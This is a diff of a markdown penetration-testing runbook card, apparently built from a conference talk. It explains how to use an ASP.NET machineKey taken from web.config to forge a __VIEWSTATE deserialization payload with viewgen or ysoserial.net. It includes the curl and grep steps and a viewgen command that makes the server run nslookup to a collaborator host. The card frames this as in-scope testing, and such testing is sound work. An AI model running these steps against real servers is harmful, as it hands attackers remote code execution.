@@ -1,68 +1,124 @@
-# Batch 04 — Config keys → VIEWSTATE RCE
+# Batch 04 — machineKey → VIEWSTATE RCE
+
+## FILL IN
+
+```bash
+TARGET="https://app.company.com"
+PAGE="/SomePage.aspx"          # any .aspx that has __VIEWSTATE
+OAST="xxxx.oastify.com"        # your collaborator host
+# keys from web.config (batch 03):
+VK="PASTE_validationKey_HEX"
+DK="PASTE_decryptionKey_HEX"
+```
 
 ## GOAL
-Use `machineKey` from `web.config` to forge VIEWSTATE and prove code run (OOB).
+With keys from `web.config`, forge VIEWSTATE and prove the server runs your command (OOB only).
 
 ## TIME
 ~1–2 hours
 
 ## YOU NEED
-- Keys from batch 03  
-- RCE allowed  
-- OAST  
+- `web.config` with machineKey (batch 03)
+- RCE allowed in scope
+- Collaborator (Burp OAST / interactsh / etc.)
+- Tool: [viewgen](https://github.com/0xacb/viewgen) **or** ysoserial.net
 
 ---
 
-## WHY (30 seconds)
+## WHY (kid version) — matches the slide
 
-ASP.NET WebForms stores page state in a blob called **VIEWSTATE**.  
-The server **signs** (and sometimes encrypts) it with secrets from `web.config` called **machineKey**.  
+Talk says: **if you can read web.config on IIS, you can almost always get RCE.**
 
-If you have those secrets, you can build a VIEWSTATE that deserializes into **your code** (classic insecure deserialize).  
+1. Page sends a blob called `__VIEWSTATE`  
+2. Server checks it with **validationKey** / **decryptionKey**  
+3. Server unpacks it with **ObjectStateFormatter**  
+4. Evil blob → runs code  
 
-No keys → almost no forge. Keys → often game over on old ASP.NET.
+Chain: `VIEWSTATE → ObjectStateFormatter → RCE`  
+Tool named on slide: **viewgen**
 
 ---
 
 ## DO THIS
 
-### 1) Copy keys
+### 1) Copy keys from web.config
 
 ```bash
 grep -i machineKey web.config
-# validationKey=...
-# decryptionKey=...
-# validation= / decryption=
 ```
 
-### 2) Confirm page has VIEWSTATE
+You need lines like:
+
+```xml
+validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES"
+```
+
+Paste into `VK=` and `DK=` above. Note the alg names too.
+
+### 2) Confirm the page uses VIEWSTATE
 
 ```bash
-curl -sk "https://TARGET/SomePage.aspx" | grep -o '__VIEWSTATE' | head
+curl -sk "$TARGET$PAGE" | grep -o '__VIEWSTATE' | head
 ```
 
-### 3) Forge payload
+If nothing, try other `.aspx` pages from the site map.
 
-Use [viewgen](https://github.com/0xacb/viewgen) or ysoserial.net (check `--help` on your install).  
-Prefer command that only hits OAST (`nslookup your.oast`).
+### 3) Install viewgen (once)
 
-### 4) Send forged `__VIEWSTATE` in a normal POST to that page
+```bash
+# follow current README on https://github.com/0xacb/viewgen
+# typical:
+pip install viewgen
+# or git clone and run as project docs say
+viewgen --help
+```
 
-Watch OAST. Save request/response.
+### 4) Generate payload (OAST only — no destructive cmds)
+
+```bash
+# EXAMPLE shape — flags change by tool version; always check: viewgen --help
+# Concept from talk: keys in → gadget out
+viewgen --validationkey "$VK" --decryptionkey "$DK" \
+  --validationalg SHA1 --decryptionalg AES \
+  -g "nslookup $OAST"
+```
+
+If your viewgen build uses different flags, copy the exact example from `viewgen --help` / README and only swap keys + OAST command.
+
+**Fallback:** ysoserial.net ViewState generators (Windows) with same keys.
+
+### 5) Send forged VIEWSTATE
+
+In Burp Repeater:
+
+1. Load a normal POST to `$PAGE` that already has `__VIEWSTATE=...`  
+2. Replace `__VIEWSTATE` value with the forged blob  
+3. Keep other fields if needed (`__VIEWSTATEGENERATOR`, etc.)  
+4. Send  
+
+**Win:** DNS/HTTP hit on OAST.
+
+### 6) Write 3 lines
+
+```text
+VIEWSTATE page:
+OOB: yes/no
+Tool used:
+```
 
 ---
 
 ## IF / THEN
 
-| What you saw | What you do |
-|--------------|-------------|
-| OOB hit | Critical finding |
-| Encrypted VIEWSTATE fails | Re-check decryptionKey + sticky session on load balancer |
-| No VIEWSTATE on site | Close card → **05** |
+| You see | You do |
+|---------|--------|
+| OAST hit | Critical finding — stop noisy tests |
+| Fail + encryption on | Re-check decryptionKey + alg; try sticky session |
+| No VIEWSTATE anywhere | Close card → **05** |
 
 ---
 
 ## NEXT
 → [05-dnspy-dependencies.md](./05-dnspy-dependencies.md)
 
-**Slide map:** deck slides 16–17 (machineKey → viewgen → ObjectStateFormatter RCE).
+**Slides:** 16–17 · tool: viewgen · research links on slide
